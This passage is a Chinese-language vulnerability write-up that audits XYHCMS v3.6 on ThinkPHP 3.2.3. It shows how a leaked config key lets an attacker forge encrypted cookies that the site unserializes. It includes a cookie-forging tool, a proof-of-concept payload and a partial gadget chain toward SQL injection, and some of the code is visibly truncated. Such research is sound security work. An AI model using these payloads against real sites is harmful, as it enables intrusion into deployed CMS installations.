2020年5月份的时候看到先知有一篇文章  
这个漏洞非常非常简单，经典插配置文件getshell，而且使用了这种标签风格以应对代码对
可以发现这些配置选项都是以序列化形式存储在配置文件当中的，且为php后缀。
以安全的角度来想，既然这些配置信息不是写在php代码中以变量存储(大多数cms比如discuz的做法)，就不应该以php后缀存储。否则极易产生插配置文件getshell的漏洞。  
即使认真过滤了php标签，也可能产生xss和信息泄露的问题。  
如果是以序列化形式存储，那么配置文件不管什么后缀，都不应该被轻易访问到，要么像thinkphp5一样配置文件根本不在web目录中，要么每次建站随机配置文件名称。  
最后，这个序列化形式存储在文件中也有待商榷，容易产生反序列化问题。  
当然，也可以学大多数cms的另外一个做法，配置信息存在数据库中。
下载源码，搭一搭开始审计xyhcms_v3.6_20201128  
由于注意到配置文件是以反序列化方式存储，所以我优先搜了搜unserialize(
此cms使用的thinkphp3.2.3框架，所以下面的不用看了，只看  
/App/Common/Common/function.php
发现get_cookie是使用的反序列化
    //function get_cookie($name, $key = '@^%$y5fbl') {
    function get_cookie($name, $key = '') {
        if (!isset($_COOKIE[$name])) {
            return null;
        }
        $key = empty($key) ? C('CFG_COOKIE_ENCODE') : $key;
        $value = $_COOKIE[$name];
        $key = md5($key);
        $sc = new \Common\Lib\SysCrypt($key);
        $value = $sc->php_decrypt($value);
        return unserialize($value);
    }
$key默认为空，有注释可以固定为【@^%$y5fbl】，为空则使用CFG_COOKIE_ENCODE当key，然后md5加密$key，传入
SysCrypt类当密钥，加密代码见/App/Common/Lib/SysCrypt.class.php。
$value是COOKIE中参数为$name对应的值，用SysCrypt类的php_decrypt方法解密，解密之后是一个序列化字符串，可以被反序列化。  
但这个反序列化的前提是知道key，如果被取消注释了，那么key为【@^%$y5fbl】，如果默认没改，就是CFG_COOKIE_ENCODE。而CFG_COOKIE_ENCODE这个值创建网站时会被随机分配一个，且可以在后台改。
且在/App/Runtime/Data/config/site.php中被泄露。
总结一下就是cookie传值，site.php泄露key，这个值先被php_decrypt解密，再进行反序列化，和shiro相似。  
那么找到了反序列化入口，而且是极易利用的COOKIE里面。但管理员登录后COOKIE中并没有加密字符串，搜一下get_cookie(，发现是前台注册会员用的。
前台随便注册一个会员，在COOKIE中发现加密字符串，里面任意一个都可以作为序列化入口。
比如nickname=XSIEblowDDRXIVJxBTcHPg5hAWsDbVVoACdcPg%3D%3D就是前台账户sonomon的序列化并加密。这里用接口试一下就明白了。  
PS：后面发现使用uid更加通用。  
/xyhcms/index.php?s=/Public/loginChk.html
这里将get_cookie，set_cookie，SysCrypt相关的代码抄一下并修改好，写处php加解密工具。
     crypt_key = $crypt_key;
        }
        public function php_encrypt($txt) {
          srand((double)microtime() * 1000000);
           $encrypt_key = md5(rand(0,32000));
           $ctr = 0;
           $tmp = '';
          for($i = 0;$i crypt_key));
        }
        public function php_decrypt($txt) {
          $txt = self::__key(base64_decode($txt),$this -> crypt_key);
           $tmp = '';
          for($i = 0;$i  crypt_key = null;
        }
    }
    function get_cookie($name, $key = '') {
        $key = 'YzYdQmSE2';
        $key = md5($key);
        $sc = new SysCrypt($key);
        $value = $sc->php_decrypt($name);
        return unserialize($value);
    }
    function set_cookie($args, $key = '') {
        $key = 'YzYdQmSE2';
        $value = serialize($args);
        $key = md5($key);
        $sc = new SysCrypt($key);
        $value = $sc->php_encrypt($value);
        return $value;
    }
    $a = set_cookie('luoke','');
    echo $a.'';
    echo get_cookie($a,'');
得到加密序列化字符串
放到cookie里试一下
完美，接下来就是需要找到反序列化链，我们先随便找个__destruct(修改源码，加个var_dump(1)，看能否触发。  
/Include/Library/Think/Image/Driver/Imagick.class.php
    public function __destruct() {
            var_dump(1);
            empty($this->img) || $this->img->destroy();
        }
写好POC
     crypt_key = $crypt_key;
        }
        public function php_encrypt($txt) {
         srand((double)microtime() * 1000000);
           $encrypt_key = md5(rand(0,32000));
           $ctr = 0;
           $tmp = '';
         for($i = 0;$i crypt_key));
        }
        public function php_decrypt($txt) {
         $txt = self::__key(base64_decode($txt),$this -> crypt_key);
           $tmp = '';
         for($i = 0;$i  crypt_key = null;
        }
    }
    function get_cookie($name, $key = '') {
        $key = 'YzYdQmSE2';
        $key = md5($key);
        $sc = new \Common\Lib\SysCrypt($key);
        $value = $sc->php_decrypt($name);
        return unserialize($value);
    }
    function set_cookie($args, $key = '') {
        $key = 'YzYdQmSE2';
        $value = serialize($args);
        $key = md5($key);
        $sc = new \Common\Lib\SysCrypt($key);
        $value = $sc->php_encrypt($value);
        return $value;
    }
    $b = new \Think\Image\Driver\Imagick();
    $a = set_cookie($b,'');
    echo str_replace('+','%2B',$a);
如上图，成功以反序列化方式触发
**destruct()，后续测试发现也不需要登录。那么万事具备，只差反序列化链，但是众所周知thinkphp5.x都已被审计出反序列化链，thinkphp3.2.3却并不存在反序列化链，9月份时我问某个群里，也都说的没有。  
我自己的找链思路如下，全局找**destruct()就只有一个靠谱的。  
/Include/Library/Think/Image/Driver/Imagick.class.php
    public function __destruct() {
            empty($this->img) || $this->img->destroy();
        }
$this->img可控，也就是说可以触发任意类的destroy方法，或者触发 **call方法。**
call没有任何靠谱的，反倒是destroy()两个都比较靠谱。  
/Include/Library/Think/Session/Driver/Db.class.php  
/Include/Library/Think/Session/Driver/Memcache.class.php  
Db.class看起来可以SQL注入，而Memcache.class看起来可以执行任意类的delete方法。但两者的destroy方法都有个问题，必须要传入一个$sessID参数，而Imagick.class的destroy并不能传参。所以在这儿就断掉了。  
当时我在php7环境中测试，这个东西卡死我了，后来有人找出了thinkphp3.2.3的反序列化链，我才明白原来换php5就行了。直骂自己菜，对php版本特性知道的太少了，否则我可能早就审计出thinkphp3.2.3的反序列化链了。  
    hander)?$this->hander[0]:$this->hander;
           mysql_query("DELETE FROM ".$this->sessionTable." WHERE session_id = '$sessID'",$hander); 
           if(mysql_affected_rows($hander)) 
               return true; 
           return false; 
       }
只能Memcache.class
    public function destroy($sessID) {
            return $this->handle->delete($this->sessionName.$sessID);
        }
$this->handle和$this->sessionName均可控，此时等于可执行任意类的delete方法。  
此时找delete方法，发现都跟数据库有关，且必须传输数组，由于$this->sessionName.$sessID必定是个字符串，所以得找一个能转数组的。  
/Include/Library/Think/Model.class.php
    public function delete($options = array()) {
            $pk = $this->getPk();
            if (empty($options) && empty($this->options['where'])) {
                if (!empty($this->data) && isset($this->data[$pk])) {
                    return $this->delete($this->data[$pk]);
                } else {
                    return false;